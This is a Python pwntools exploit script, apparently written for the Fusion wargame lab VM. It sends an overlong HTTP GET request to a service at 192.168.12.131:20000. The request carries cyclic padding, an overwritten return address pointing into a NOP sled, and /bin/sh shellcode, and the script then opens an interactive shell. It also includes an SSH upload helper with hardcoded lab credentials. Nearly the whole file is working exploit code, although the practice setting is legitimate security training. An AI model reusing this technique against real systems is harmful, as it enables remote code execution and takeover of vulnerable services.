#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')



#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def sendFile(payload):
    s = ssh(host='192.168.12.131', user='fusion', password='godmode')
    s.upload_data(payload, '/tmp/payload')

io = remote('192.168.12.131', 20000)
print(io.recvS())
padding = cyclic_find(0x61616b62)

payload =  b'GET ' 
payload += b'a'*padding 
payload += p32(0xbffff8f8 + 0x100)  # We only need to land somewhere in our NOP sled
payload += b' HTTP/1.1' # Necessary formatter 
payload += b'\x90'*100  # NOP sled
payload +=  asm(shellcraft.sh()) # Our shellcode
#sendFile(payload)
io.sendline(payload)
io.interactive()

# shellcode = asm(shellcraft.sh())
# flag = io.recv(...)
# log.success(flag)


